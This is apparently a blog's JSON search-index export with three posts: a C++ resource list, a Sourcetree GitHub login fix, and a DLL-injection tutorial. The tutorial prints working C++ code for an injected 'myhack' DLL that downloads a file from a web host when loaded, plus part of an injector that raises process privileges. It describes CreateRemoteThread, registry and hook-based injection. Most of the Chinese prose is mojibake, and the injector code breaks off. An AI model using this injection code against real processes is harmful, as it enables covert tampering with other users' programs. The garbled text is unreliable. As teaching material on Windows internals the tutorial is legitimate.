çŸ¥é“å‡ ä¸ªï¼Ÿ ç²¾é€‰ 30 ä¸ª C++ é¢è¯•é¢˜ï¼ˆå«è§£æï¼‰ è…¾è®¯ C++ ç¬”è¯•&#x2F;é¢è¯•é¢˜åŠç­”æ¡ˆ C++ ä¸‡å­—é•¿æ–‡ç¬¬ä¸€ç¯‡â€”æ‹¿ä¸‹å­—èŠ‚é¢è¯• ã€Šé€†è¢­è¿›å¤§å‚ã€‹ä¹‹C++ç¯‡49é—®49ç­”(ç»å¯¹çš„å¹²è´§) ã€Šé€†è¢­è¿›å¤§å‚ã€‹ç¬¬äºŒå¼¹ä¹‹C++è¿›é˜¶ç¯‡59é—®59ç­”(è¶…ç¡¬æ ¸å¹²è´§) ã€Šé€†è¢­è¿›å¤§å‚ã€‹ä¹‹C++æé«˜ç¯‡79é—®79ç­” è‡ªå·±åŠ¨æ‰‹å®ç°ä¸€ä¸ªmallocå†…å­˜åˆ†é…å™¨ | 30å›¾ ç°ä»£C++ä¹‹æ‰‹å†™æ™ºèƒ½æŒ‡é’ˆ 10å¼ å›¾22æ®µä»£ç ï¼Œä¸‡å­—é•¿æ–‡å¸¦ä½ ææ‡‚è™šæ‹Ÿå†…å­˜æ¨¡å‹å’Œmallocå†…éƒ¨åŸç† é¢è¯•ç³»åˆ—ä¹‹C++çš„å¯¹è±¡å¸ƒå±€ã€å»ºè®®æ”¶è—ã€‘ c++ä»£ç æ•´æ´ä¹‹é“ æºç åˆ†æC++çš„stringçš„å®ç° 23ç§è®¾è®¡æ¨¡å¼çš„é€šä¿—è§£é‡Šï¼Œçœ‹å®Œç§’æ‡‚ ä¸€ä½å¤§ä½¬å¯¹äº Qt å­¦ä¹ çš„æœ€å…¨æ€»ç»“ï¼ˆä¸‰ä¸‡å­—å¹²è´§ï¼‰ 3ä¸‡å­—Linuxæ€»ç»“ åŠ å¯†ä¸è§£å¯† TCPæ•°æ®ç²˜åŒ…çš„å¤„ç† C++è§†é¢‘æ¨èï¼š C++è§†é¢‘å­¦ä¹ æ•™ç¨‹åŸºç¡€ç¯‡ åéƒ‘è‰è€å¸ˆè§†é¢‘ ä¾¯æ·C++è§†é¢‘å…¨é›†ä¸é™ˆç¡•ç½‘ç»œç¼–ç¨‹ æœ€å¥½çš„Qtå…¨å¥—è§†é¢‘æ•™ç¨‹ C++ å¼€æºæ¨èï¼š FreeNOS:æ·±å…¥ç†è§£C++ï¼Œä»¥åŠæ“ä½œç³»ç»ŸåŸç†ã€‚FreeNOSï¼ˆFree Niekçš„æ“ä½œç³»ç»Ÿï¼‰æ˜¯ä¸€ä¸ªåŸºäºC++çš„åŸºäºå¾®å†…æ ¸çš„å­¦ä¹ æ“ä½œç³»ç»Ÿã€‚è¿™æ˜¯ä¸€ä¸ªç”¨C++å®ç°çš„å¾®å†…æ ¸çš„æ“ä½œç³»ç»Ÿï¼Œå„ç§å®å†…æ ¸ä¸­çš„æœåŠ¡ä½œä¸ºä¸€ä¸ªç‹¬ç«‹çš„servicesåœ¨å¾®å†…æ ¸ä¸­ï¼ŒåŸºäºæ¶ˆæ¯çš„é€šä¿¡æ–¹å¼ï¼Œè¿™ç‚¹å…¶å®è·Ÿmacå†…æ ¸ä¸­çš„maché‚£éƒ¨åˆ†æœºåˆ¶ç›¸ä¼¼ã€‚ Boost:Boost åº“æ˜¯ä¸€ä¸ªç»è¿‡åƒé”¤ç™¾ç‚¼ã€å¯ç§»æ¤ã€æä¾›æºä»£ç çš„C++ åº“ï¼Œä½œä¸ºæ ‡å‡†åº“çš„åå¤‡ï¼Œæ˜¯C++ æ ‡å‡†åŒ–è¿›ç¨‹çš„å‘åŠ¨æœºä¹‹ä¸€ã€‚ Boost åº“ç”±C++æ ‡å‡†å§”å‘˜ä¼šåº“å·¥ä½œç»„æˆå‘˜å‘èµ·ï¼Œåœ¨C++ ç¤¾åŒºä¸­å½±å“ç”šå¤§ï¼Œå…¶æˆå‘˜å·²è¿‘2000 äººã€‚ Boost åº“ä¸ºæˆ‘ä»¬å¸¦æ¥äº†æœ€æ–°ã€æœ€é…·ã€æœ€å®ç”¨çš„æŠ€æœ¯ï¼Œæ˜¯ä¸æŠ˜ä¸æ‰£çš„â€œ å‡†â€ æ ‡å‡†åº“ã€‚ muduo:ä¸€ä¸ªåŸºäº Reactor æ¨¡å¼çš„ç°ä»£ C++ ç½‘ç»œåº“ï¼Œå®ƒé‡‡ç”¨éé˜»å¡ IO æ¨¡å‹ï¼ŒåŸºäºäº‹ä»¶é©±åŠ¨å’Œå›è°ƒï¼Œæ”¯æŒå¤šæ ¸å¤šçº¿ç¨‹ï¼Œé€‚åˆç¼–å†™ Linux æœåŠ¡ç«¯å¤šçº¿ç¨‹ç½‘ç»œåº”ç”¨ç¨‹åºã€‚ libevent:ä¸€ä¸ªæ˜¯è½»é‡çº§çš„ç½‘ç»œåº“. log4cpp:æ—¥å¿—åº“ï¼Œ æ”¯æŒå¤šçº¿ç¨‹ï¼Œ æ—¥å¿—é‡å®šå‘åˆ°ç½‘ç»œç­‰éƒ½æœ‰ï¼Œ åæ­£ä½ èƒ½æƒ³åˆ°çš„æ—¥å¿—çš„åŠŸèƒ½ï¼Œ éƒ½æœ‰ã€‚ OpenSSL:OpenSSL åŒ…å«ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ç”¨æ¥å®ŒæˆOpenSSL åº“ä¸­çš„æ‰€æœ‰åŠŸèƒ½ï¼Œæ›´å¥½çš„æ˜¯ï¼Œå®ƒå¯èƒ½å·²ç»å®‰è£…åˆ°ä½ çš„ç³»ç»Ÿä¸­äº†ã€‚ wfrest:ç®€å•é«˜æ•ˆçš„c++11å¼‚æ­¥restfulç½‘ç»œæ¡†æ¶ã€‚ workflow:å½“å‰æœ€ç«æœ€ç®€æ´å¥½ç”¨çš„c++å¼‚æ­¥ç½‘ç»œåº“workflowã€‚ modern-cpp-tutorial:modern-cpp-tutorial æ˜¯ç°ä»£ C++ æ•™ç¨‹ï¼Œå®ƒçš„ç›®çš„æ˜¯æä¾›å…³äºç°ä»£ C++ï¼ˆ2020 å¹´å‰ï¼‰çš„ç›¸å…³ç‰¹æ€§çš„å…¨é¢ä»‹ç»ã€‚ MyTinySTL:ç”¨ C++11 é‡æ–°å¤å†™äº†ä¸€ä¸ªå°å‹ STLï¼ˆå®¹å™¨åº“ï¼‹ç®—æ³•åº“ï¼‰ã€‚ä»£ç ç»“æ„æ¸…æ™°è§„èŒƒã€åŒ…å«ä¸­æ–‡æ–‡æ¡£ä¸æ³¨é‡Šï¼Œå¹¶ä¸”è‡ªå¸¦ä¸€ä¸ªç®€å•çš„æµ‹è¯•æ¡†æ¶ï¼Œé€‚åˆ C++ æ–°æ‰‹æ¥å®è·µä¸€ç•ªã€‚ Tinytetris:Tinytetris æ˜¯ä¸€ä¸ªç”¨ C++ ç¼–å†™çš„ç»ˆç«¯ç‰ˆä¿„ç½—æ–¯æ–¹å—æ¸¸æˆã€‚å®ƒæä¾›äº†ä¸¤ä¸ªç‰ˆæœ¬çš„æºç ï¼Œåˆ†ä¸ºæ³¨é‡Šç‰ˆå’Œåº“ç‰ˆï¼Œæ³¨é‡Šè¾ƒå¤šæ˜“äºç†è§£å’Œå­¦ä¹ ã€‚ calculator: æ“ä½œç³»ç»Ÿè®¡ç®—æœºç½‘ç»œæ•°æ®åº“é©¬ä¸åœè¹„çš„æ›´æ–°ä¸­ã€‚ã€‚ã€‚ã€‚ã€‚","categories":[],"tags":[]},{"title":"è§£å†³Sourcetreeæ¨githubä¸åœå¼¹ç™»å½•çª—Logon failed, use ctrl+c to cancel basi","slug":"è§£å†³Sourcetreeæ¨githubä¸åœå¼¹ç™»å½•çª—Logon-failed-use-ctrl-c-to-cancel-basi","date":"2023-11-26T23:49:11.000Z","updated":"2023-12-24T17:38:28.415Z","comments":true,"path":"2023/11/27/è§£å†³Sourcetreeæ¨githubä¸åœå¼¹ç™»å½•çª—Logon-failed-use-ctrl-c-to-cancel-basi/","link":"","permalink":"http://example.com/2023/11/27/%E8%A7%A3%E5%86%B3Sourcetree%E6%8E%A8github%E4%B8%8D%E5%81%9C%E5%BC%B9%E7%99%BB%E5%BD%95%E7%AA%97Logon-failed-use-ctrl-c-to-cancel-basi/","excerpt":"æœ€è¿‘æœ‰ä¸€æ®µæ—¶é—´æ²¡ç”¨ GitHubï¼Œæ–°å»ºäº†ä¸€ä¸ªä»“åº“ï¼Œæ‰“å¼€ Sourcetree â†’ + â†’ Clone â†’ å¡«å…¥gitåœ°å€ï¼Œé¡ºåˆ©æ‹‰å–äº†ä»“åº“åˆ†æ”¯ã€‚åˆ†æ”¯ä¸€ä¸ª â†’ æäº¤ â†’ æ¨é€ï¼Œå¿½ç„¶å¼¹å‡ºäº†GitHubç™»å½•çª—å£ï¼Œè®°å¾—ä»¥å‰æ›¾ç»å¼¹è¿‡ä¸€æ¬¡ï¼Œå¿˜è®°ä»€ä¹ˆæƒ…å†µäº†ï¼Œé‚£å°±å¡«å†™ç”¨æˆ·åã€å¯†ç ï¼Œloginå§ï¼š çº¢è‰²é—ªçœ¼å•Šï¼ŒæŠ¥é”™å•Šï¼~git -c diff.mnemonicprefix&#x3D;false -c core.quotepath&#x3D;false â€“no-optional-locks push -v â€“tags origin main:mainLogon failed, use ctrl+c to cancel basic credential prompt.","text":"æœ€è¿‘æœ‰ä¸€æ®µæ—¶é—´æ²¡ç”¨ GitHubï¼Œæ–°å»ºäº†ä¸€ä¸ªä»“åº“ï¼Œæ‰“å¼€ Sourcetree â†’ + â†’ Clone â†’ å¡«å…¥gitåœ°å€ï¼Œé¡ºåˆ©æ‹‰å–äº†ä»“åº“åˆ†æ”¯ã€‚åˆ†æ”¯ä¸€ä¸ª â†’ æäº¤ â†’ æ¨é€ï¼Œå¿½ç„¶å¼¹å‡ºäº†GitHubç™»å½•çª—å£ï¼Œè®°å¾—ä»¥å‰æ›¾ç»å¼¹è¿‡ä¸€æ¬¡ï¼Œå¿˜è®°ä»€ä¹ˆæƒ…å†µäº†ï¼Œé‚£å°±å¡«å†™ç”¨æˆ·åã€å¯†ç ï¼Œloginå§ï¼š çº¢è‰²é—ªçœ¼å•Šï¼ŒæŠ¥é”™å•Šï¼~git -c diff.mnemonicprefix&#x3D;false -c core.quotepath&#x3D;false â€“no-optional-locks push -v â€“tags origin main:mainLogon failed, use ctrl+c to cancel basic credential prompt. â€œLogon failedâ€¦â€ å¤§æ¦‚æ˜¯æ‰‹å¿«ï¼Œå¯†ç è¾“é”™äº†å§ï¼Œå†æ¥ä¸€éï¼Œä»€ä¹ˆï¼Ÿè¿˜æ˜¯å¤±è´¥ï¼Œä¼°è®¡æ˜¯å¯†ç è‡ªå·±ä¹Ÿè®°é”™äº†ã€‚èµ¶ç´§ä¸Šå®˜ç½‘ç™»å½•è¯•ä¸€ä¸‹ï¼Œå®åœ¨ä¸è¡Œé‡ç½®ã€‚ã€‚ã€‚å’¦ï¼Ÿè¿˜æ˜¯åˆšæ‰çš„ç”¨æˆ·åã€å¯†ç ï¼Œå®˜ç½‘é¡ºåˆ©ç™»å½•ï¼Œæ²¡é—®é¢˜å•Šã€‚å›æ¥ Sourcetree å†è¯•ä¸€éï¼Œé”™è¯¯ç…§å¸¸ã€‚çœ‹æ¥å…«æˆ Sourcetree å‡ºæ¯›ç—…äº†ã€‚baidu å§ï¼Œå“¦ï¼Œæœ‰äººè¯´åˆ°ä»€ä¹ˆ Git è½¯ä»¶æ›´æ–°äº†ï¼Œä»€ä¹ˆç™»å½•æœºåˆ¶å˜äº†ï¼Œä¸èƒ½å†ç”¨ç™»å½•æ¡†çš„æ–¹å¼ç™»å½•äº†ï¼Œæ›´æ–°åå°±ä¸ä¼šå‡ºç°ç™»é™†æ¡†äº†ï¼Œä¼šè‡ªåŠ¨è¿æ¥åˆ° GitHub å®˜ç½‘éªŒè¯ã€‚ã€‚ã€‚äº‘äº‘ã€‚å—¯ï¼Œå’Œæˆ‘çš„æƒ…å†µç¬¦åˆï¼Œèµ¶ç´§ç‚¹å‡»æ–‡ç« ä¸­ç»™çš„å®˜æ–¹ Git é“¾æ¥ï¼Œä¸‹è½½äº†æœ€æ–°ç‰ˆæœ¬çš„ Gitï¼Œå®‰è£…ã€‚ä¿é™©èµ·è§é‡å¯ç”µè„‘ï¼Œæ‰“å¼€ Sourcetreeï¼Œæäº¤ï¼Œå“‡ï¼Œå±…ç„¶è¿˜æ˜¯æœ‰å¼¹çª—å•Šï¼Œç¨³å®šæƒ…ç»ªï¼Œè¯´ä¸å®šè¿™æ¬¡ç™»å½•å°±å¯ä»¥äº†ï¼Œè¾“å…¥ç”¨æˆ·åã€å¯†ç  â†’ loginï¼ŒæŠ¥é”™ä¾æ—§ã€‚çœ‹æ¥è¿™æ–¹æ³•ä¸è¡Œã€‚ç»§ç»­baiduï¼Œåˆè¯•äº†åœ¨ä»“åº“è®¾ç½®ä¸­ä¿®æ”¹ git åœ°å€ä¸º &#x75;&#x73;&#101;&#x72;&#x4e;&#x61;&#109;&#x65;&#x40;&#103;&#105;&#x74;&#x68;&#x75;&#x62;&#x2e;&#99;&#x6f;&#x6d;&#x2F;xxx&#x2F;xx.git çš„æ ¼å¼ï¼Œè¿˜æ˜¯ä¸è¡Œã€‚æ˜¯æœ€åè¿™ä¸ªæç¤ºå¸®åŠ©äº†æˆ‘ï¼Œæœ‰ç½‘å‹è¯´éœ€è¦â€œä½¿ç”¨OAuthè¿›è¡Œèº«ä»½éªŒè¯â€ï¼Œç¿»äº†ç¿» Sourcetree èœå•ï¼Œæœ€åç»ˆäºåœ¨ å·¥å…· â†’ é€‰é¡¹ ä¸­æ‰¾åˆ°ç­”æ¡ˆã€‚é€‰é¡¹ â†’ éªŒè¯ é€‰é¡¹å¡ã€‚çœ‹åˆ°ç°åœ¨çš„ gitHub ç™»å½•éªŒè¯ä¸º Basic ï¼Œ ç›´æ¥ç¼–è¾‘ç”¨æˆ·ï¼Œè¾“å…¥å¯†ç ï¼Œå¥½åƒæ— ååº”ã€‚æ–°å»ºä¸€ä¸ªå§ï¼Œå³ä¸Šè§’â€œæ·»åŠ â€ï¼ŒæœåŠ¡å•†: GitHub, éªŒè¯ä¸€å®šé€‰æ‹© OAuthï¼Œè¿™æ—¶ï¼Œä¸‹é¢çš„ç”¨æˆ·åä¼šæ˜¯ç¦ç”¨çŠ¶æ€ï¼š ç›´æ¥ç‚¹å‡»ä¸‹é¢çš„æŒ‰é’®â€œåˆ·æ–° OAuth ä»¤ç‰Œâ€ï¼Œå¥‡è¿¹å‡ºç°äº†ï¼Œè‡ªåŠ¨è·³è½¬åˆ°æµè§ˆå™¨æ‰“å¼€äº† GitHub ç™»å½•ç•Œé¢ï¼š èµ¶ç´§ç™»å½•å§ï¼Œç™»å½•åï¼š çœ‹åˆ°æˆæƒæˆåŠŸï¼å†æ¬¡è¿”å› Sourcetree ç•Œé¢ï¼Œçœ‹åˆ°ç™»å½•çª—ä¸Šå·²ç»æ˜¾ç¤ºç»¿è‰²âˆš ï¼Œè®¤è¯æˆåŠŸï¼ ç¡®å®šï¼Œè¿™æ—¶å¯ä»¥çœ‹åˆ°éªŒè¯çª—å£ä¸­å¤šäº†ä¸€ä¸ªè´¦æˆ·ï¼Œä¸‹é¢ â€œGit å·²å­˜å¯†ç â€ä¸­ä¹Ÿæ·»åŠ äº†ä¸€ä¸ªGitç”¨æˆ·ï¼Œä½†æ˜¯ä¸¤ä¸ªçš„éªŒè¯æ–¹å¼æ˜¯ä¸åŒçš„ï¼Œè¿™ç‚¹ä¸å¤ªæ˜ç™½å…·ä½“æ„æ€ï¼Œæœ‰æ—¶é—´æŸ¥ä¸€ä¸‹ã€‚å¥½äº†ï¼Œæ¥ä¸‹æ¥ï¼Œèµ¶ç´§æ¨å•Šã€‚ç¥ä½ ä¹Ÿ é¡º åˆ© æ¨ é€ï¼ æ–¹æ¡ˆäºŒä¹Ÿå¯ä»¥åœ¨GitHubä¸ªäººç”¨æˆ·é‡Œç”Ÿæˆä¸€ä¸ªæ–°çš„noteå’Œtokensï¼Œç¬¬ä¸€æ¬¡è¾“å…¥è‡ªå·±çš„GitHubè´¦å·å’Œå¯†ç ï¼Œç„¶ååœ¨ç¬¬äºŒæ¬¡è¾“å…¥usernuserameå’Œpasswordçš„æ—¶å€™è¾“å…¥å¯¹åº”çš„noteå’Œtokenså°±å¥½äº†ã€‚å…·ä½“æ“ä½œæ­¥éª¤å¯ä»¥å‚è€ƒåšå®¢https://blog.csdn.net/weixin_46622106/article/details/111914231","categories":[],"tags":[]},{"title":"æ·±å…¥ç†è§£dllæ³¨å…¥","slug":"æ·±å…¥ç†è§£dllæ³¨å…¥","date":"2022-11-30T20:17:37.000Z","updated":"2023-12-24T17:38:44.738Z","comments":true,"path":"2022/12/01/æ·±å…¥ç†è§£dllæ³¨å…¥/","link":"","permalink":"http://example.com/2022/12/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3dll%E6%B3%A8%E5%85%A5/","excerpt":"DLLæ³¨å…¥æ˜¯æŒ‡å‘è¿è¡Œä¸­çš„å…¶å®ƒè¿›ç¨‹å¼ºåˆ¶æ’å…¥ç‰¹å®šçš„DLLæ–‡ä»¶ã€‚ä»æŠ€æœ¯ç»†èŠ‚æ¥è¯´ï¼ŒDLLæ³¨å…¥å‘½ä»¤å…¶å®ƒè¿›ç¨‹è‡ªè¡Œè°ƒç”¨LoadLibrary()APIï¼ŒåŠ è½½ç”¨æˆ·æŒ‡å®šçš„DLLæ–‡ä»¶ã€‚DLLæ³¨å…¥ä¸ä¸€èˆ¬DLLåŠ è½½çš„åŒºåˆ«åœ¨äºï¼ŒåŠ è½½çš„ç›®æ ‡è¿›ç¨‹æ˜¯å…¶è‡ªèº«æˆ–å…¶ä»–è¿›ç¨‹ã€‚","text":"DLLæ³¨å…¥æ˜¯æŒ‡å‘è¿è¡Œä¸­çš„å…¶å®ƒè¿›ç¨‹å¼ºåˆ¶æ’å…¥ç‰¹å®šçš„DLLæ–‡ä»¶ã€‚ä»æŠ€æœ¯ç»†èŠ‚æ¥è¯´ï¼ŒDLLæ³¨å…¥å‘½ä»¤å…¶å®ƒè¿›ç¨‹è‡ªè¡Œè°ƒç”¨LoadLibrary()APIï¼ŒåŠ è½½ç”¨æˆ·æŒ‡å®šçš„DLLæ–‡ä»¶ã€‚DLLæ³¨å…¥ä¸ä¸€èˆ¬DLLåŠ è½½çš„åŒºåˆ«åœ¨äºï¼ŒåŠ è½½çš„ç›®æ ‡è¿›ç¨‹æ˜¯å…¶è‡ªèº«æˆ–å…¶ä»–è¿›ç¨‹ã€‚ å¯ä»¥çœ‹åˆ°ï¼Œtest.dllå·²è¢«å¼ºåˆ¶æ’å…¥è¿›ç¨‹(æœ¬æ¥notepadå¹¶ä¸ä¼šåŠ è½½test.dll)ã€‚åŠ è½½åˆ°æŸä¸€è¿›ç¨‹ä¸­çš„test.dllä¸å·²ç»åŠ è½½åˆ°æŸä¸€è¿›ç¨‹ä¸­çš„dllä¸€æ ·ï¼Œæ‹¥æœ‰è®¿é—®notepad.exeè¿›ç¨‹å†…å­˜çš„æƒé™ã€‚ DLLè¢«åŠ è½½åˆ°è¿›ç¨‹åä¼šè‡ªåŠ¨è¿è¡ŒDLLMain()å‡½æ•°ï¼Œç”¨æˆ·å¯ä»¥æŠŠæƒ³æ‰§è¡Œçš„ä»£ç æ”¾åˆ°DLLMain()å‡½æ•°ï¼Œæ¯å½“åŠ è½½DLLæ—¶ï¼Œæ·»åŠ çš„ä»£ç å°±ä¼šå¾—åˆ°æ‰§è¡Œã€‚åˆ©ç”¨è¿™ç§ç‰¹æ€§å¯ä»¥ä¿®å¤ç¨‹åºBugä»¥åŠæ·»åŠ æ–°åŠŸèƒ½DllMain å‡½æ•°æ˜¯DLLæ¨¡å—çš„é»˜è®¤ å…¥å£ç‚¹ã€‚å½“WindowsåŠ è½½DLLæ¨¡å—æ—¶è°ƒç”¨è¿™ä¸€å‡½æ•°ã€‚ç³»ç»Ÿé¦–å…ˆè°ƒç”¨å…¨å±€å¯¹è±¡çš„ æ„é€ å‡½æ•°ï¼Œç„¶åè°ƒç”¨ å…¨å±€å‡½æ•°DLLMainã€‚DLLMain å‡½æ•°ä¸ä»…åœ¨å°†DLLé“¾æ¥åŠ è½½åˆ°è¿›ç¨‹æ—¶è¢«è°ƒç”¨ï¼Œåœ¨DLLæ¨¡å—ä¸è¿›ç¨‹åˆ†ç¦»æ—¶ï¼ˆä»¥åŠå…¶å®ƒæ—¶å€™ï¼‰ä¹Ÿè¢«è°ƒç”¨ã€‚ BOOL APIENTRY DllMain( HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved){ switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: &#x2F;&#x2F;æ·»åŠ æƒ³è¦æ‰§è¡Œçš„ä»£ç  &#x2F;&#x2F;å½“dllè¢«è¿›ç¨‹åŠ è½½æ—¶DLLMainè¢«è°ƒç”¨ &#x2F;&#x2F;printf(â€œ process attach of dllâ€); break; case DLL_THREAD_ATTACH: &#x2F;&#x2F;æ·»åŠ æƒ³è¦æ‰§è¡Œçš„ä»£ç  &#x2F;&#x2F;å½“æœ‰çº¿ç¨‹è¢«åˆ›å»ºæ—¶ï¼ŒDLLMainè¢«è°ƒç”¨ printf(â€œ thread attach of dllâ€); break; case DLL_THREAD_DETACH: &#x2F;&#x2F;æ·»åŠ æƒ³è¦æ‰§è¡Œçš„ä»£ç  &#x2F;&#x2F;å½“æœ‰çº¿ç¨‹ç»“æŸæ—¶ï¼ŒDLLMainè¢«è°ƒç”¨ printf(â€œ thread detach of dllâ€); break; case DLL_PROCESS_DETACH: &#x2F;&#x2F;æ·»åŠ æƒ³è¦æ‰§è¡Œçš„ä»£ç  &#x2F;&#x2F;å½“dllè¢«è¿›ç¨‹å¸è½½æ—¶ï¼ŒDLLMainè¢«è°ƒç”¨ printf(â€œ process detach of dllâ€); break; } return TRUE;} ä¸€ã€DLLæ³¨å…¥ç¤ºä¾‹ ä½¿ç”¨LoadLibrary()APIåŠ è½½æŸä¸ªDLLæ—¶ï¼Œè¯¥DLLä¸­çš„DLLMain()å‡½æ•°ä¼šè¢«è°ƒç”¨æ‰§è¡Œã€‚DLLæ³¨å…¥çš„å·¥ä½œåŸç†å°±æ˜¯ä»å¤–éƒ¨ä¿ƒä½¿ç›®æ ‡è¿›ç¨‹è°ƒç”¨LoadLibrary()API,æ‰€ä»¥ä¼šå¼ºåˆ¶è°ƒç”¨æ‰§è¡ŒDLLçš„DLLMainå‡½æ•°ã€‚å¹¶ä¸”è¢«æ³¨å…¥çš„DLLæ‹¥æœ‰ç›®æ ‡è¿›ç¨‹å†…å­˜çš„è®¿é—®æƒé™ï¼Œç”¨æˆ·å¯ä»¥éšæ„æ“ä½œã€‚ äºŒã€å®ç°DLLæ³¨å…¥çš„æ–¹æ³• 1ã€åˆ›å»ºè¿œç¨‹çº¿ç¨‹(CreatRemoteThread) 2ã€ä½¿ç”¨æ³¨å†Œè¡¨(AppInit_DLLså€¼) 3ã€æ¶ˆæ¯é’©å–ï¼ˆSetWindowsHookEx()APIï¼‰ ä¸‰ã€åˆ›å»ºè¿œç¨‹çº¿ç¨‹(CreatRemoteThread) 3.1ã€æ•ˆæœç¤ºä¾‹ è¿è¡Œprocess explorerï¼ˆæˆ–è€…ç«ç»’å‰‘ï¼Œä»»åŠ¡ç®¡ç†å™¨ï¼‰è·å–notepad.exeè¿›ç¨‹çš„pidã€‚ å¯ä»¥çœ‹è§process explorer.exeçš„pidä¸º2788ã€‚ è¿è¡ŒInjectDll.exeå°†myhack.dllæ³¨å…¥åˆ°notepad.exeè¿›ç¨‹å½“ä¸­ã€‚å¯ä»¥çœ‹åˆ°dllæ–‡ä»¶å·²ç»è¢«æ³¨å…¥åˆ°é‡Œé¢ã€‚ è¦æƒ³åœ¨process explorerä¸­çœ‹è§æ³¨å…¥çš„dllæ–‡ä»¶ï¼Œéœ€è¦ä¾æ¬¡é€‰æ‹©view-&gt;Lower Pane view-&gt;DLLSé€‰é¡¹ã€‚ è¿›è¡Œæ³¨å…¥æ—¶éœ€è¦æ³¨æ„ï¼š 1.LoadLibraryA å’Œ LoadLibraryW ä¸åŒå­—ç¬¦è¡¨ç¤ºä¹‹å‰ä¸€ç›´æ²¡æœ‰æˆåŠŸï¼Œæ²¡æœ‰ä½¿ç”¨L,ä½†æ˜¯ä½¿ç”¨äº†LoadLibraryWï¼Œå¯¼è‡´åŠ è½½dllå¤±è´¥ï¼Œå¦‚æœä¸ä½¿ç”¨Lï¼Œè¯·ç”¨LoadLibraryA 2.æ³¨å†Œçš„æ—¶å€™æ³¨æ„DLLå®Œæ•´è·¯å¾„ï¼Œé™¤éè¢«æ³¨å…¥ç¨‹åºå’Œdllåœ¨åŒä¸€ä¸ªæ–‡ä»¶å¤¹InjectDll.exe 3480 D:\\test\\myhack.dll åŒæ—¶å¯ä»¥çœ‹è§æ–‡ä»¶å†…å·²ç»å¤šäº†ä¸€ä¸ªhtmlæ–‡ä»¶ï¼Œæ­¤æ–‡ä»¶æ˜¯dllä¸­æ‰€æŒ‡å®šçš„æ–‡ä»¶ã€‚ 3.2ã€åˆ†æç¤ºä¾‹æºç  åœ¨DLLMmain()å‡½æ•°ä¸­å¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸ªdllè¢«åŠ è½½(DLL_PROCESS_ATTACH)æ—¶,å…ˆè¾“å‡ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼ˆâ€&lt;myhack.dll&gt; Injection!!!â€ï¼‰ï¼Œç„¶åå†åˆ›å»ºçº¿ç¨‹è°ƒç”¨å‡½æ•°ï¼ˆThreadProcï¼‰ã€‚åœ¨ThreadProcå‡½æ•°ä¸­é€šè¿‡è°ƒç”¨URLDownloadToFileæ¥ä¸‹è½½æŒ‡å®šç½‘ç«™çš„index.htmlæ–‡ä»¶ã€‚å‰é¢æåˆ°è¿‡ï¼Œå‘è¿›ç¨‹æ³¨å…¥dllåä¼šè°ƒç”¨dllçš„DLLMainå‡½æ•°ã€‚æ‰€ä»¥å½“dllæ–‡ä»¶æ³¨å…¥åˆ°exeè¿›ç¨‹åï¼Œä¼šè°ƒç”¨URLDownloadToFileä¸‹è½½æ–‡ä»¶ã€‚ &#x2F;&#x2F;myhack.cpp#include â€œwindows.hâ€#include â€œtchar.hâ€ #pragma comment(lib, â€œurlmon.libâ€) #define DEF_URL (Lâ€http://www.naver.com/index.htmlâ€œ)#define DEF_FILE_NAME (Lâ€index.htmlâ€) HMODULE g_hMod &#x3D; NULL; DWORD WINAPI ThreadProc(LPVOID lParam){ TCHAR szPath[_MAX_PATH] &#x3D; {0,}; if( !GetModuleFileName( g_hMod, szPath, MAX_PATH ) ) return FALSE; TCHAR *p = _tcsrchr( szPath, &#39;\\\\&#39; ); if( !p ) return FALSE; //ä¸‹è½½æŒ‡å®šç½‘ç«™çš„index.htmlæ–‡ä»¶ _tcscpy_s(p+1, _MAX_PATH, DEF_FILE_NAME); URLDownloadToFile(NULL, DEF_URL, szPath, 0, NULL); return 0; } BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved){ HANDLE hThread &#x3D; NULL; g_hMod = (HMODULE)hinstDLL; switch( fdwReason ) &#123; case DLL_PROCESS_ATTACH : //åŠ è½½æ—¶ OutputDebugString(L&quot;&lt;myhack.dll&gt; Injection!!!&quot;); //è¾“å‡ºè°ƒè¯•å­—ç¬¦ä¸² hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL); //åˆ›å»ºçº¿ç¨‹ CloseHandle(hThread); break; &#125; return TRUE; } mainå‡½æ•°çš„ä¸»è¦åŠŸèƒ½æ—¶æ£€æŸ¥è¾“å…¥ç¨‹åºçš„å‚æ•°ï¼Œç„¶åè°ƒç”¨InjectDLLå‡½æ•°ã€‚InjectDLLå‡½æ•°æ˜¯ç”¨æ¥è¿›è¡Œdllæ³¨å…¥çš„æ ¸å¿ƒï¼Œå…¶ä½œç”¨æ˜¯ä½¿ç›®æ ‡è¿›ç¨‹è‡ªè¡Œè°ƒç”¨LoadLibraryè¿™ä¸ªapiã€‚ &#x2F;&#x2F;InjectDLL.cpp#include â€œwindows.hâ€#include â€œtchar.hâ€ BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege){ TOKEN_PRIVILEGES tp; HANDLE hToken; LUID luid; if( !OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken) ) &#123; _tprintf(L&quot;OpenProcessToken error: %u\\n&quot;, GetLastError()); return FALSE; &#125; if( !LookupPrivilegeValue(NULL, // lookup privilege on local system lpszPrivilege, // privilege to lookup &amp;luid) ) // receives LUID of privilege &#123; _tprintf(L&quot;LookupPrivilegeValue error: %u\\n&quot;, GetLastError() ); return FALSE; &#125; tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; if( bEnablePrivilege ) tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; else tp.Privileges[0].Attributes = 0; // Enable the privilege or disable all privileges. if( !AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL) ) &#123; _tprintf(L&quot;AdjustTokenPrivileges error: %u\\n&quot;, GetLastError() ); return FALSE; &#125; if( GetLastError() == ERROR_NOT_ALL_ASSIGNED ) &#123; _tprintf(L&quot;The token does not have the specified privilege. \\n&quot;); return FALSE; &#125; return TRUE; } BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath){ HANDLE hProcess &#x3D; NULL, hThread &#x3D; NULL; HMODULE 